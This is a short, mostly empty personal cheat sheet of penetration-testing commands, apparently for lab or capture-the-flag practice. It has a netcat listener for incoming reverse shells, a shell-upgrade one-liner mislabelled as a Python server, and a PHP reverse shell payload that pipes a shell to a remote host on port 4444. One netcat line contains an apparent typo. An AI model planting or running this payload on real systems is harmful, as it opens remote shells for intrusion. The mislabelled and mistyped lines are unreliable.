# Useful Codes
---
## nMap
---



---
## Gobuster
---



---
## Hydra
---



---
## Netcat
---
- Listening for incoming RevShells
```sh
nc -lvnp port
```
- Listen for incoming calls
```sh
nc -nc ip port
```

---
## Python
---
- Python Server
```python

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

---
## Revshells
---
- PHP Reverse Shell
```php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.61 4444 >/tmp/f"); ?>

```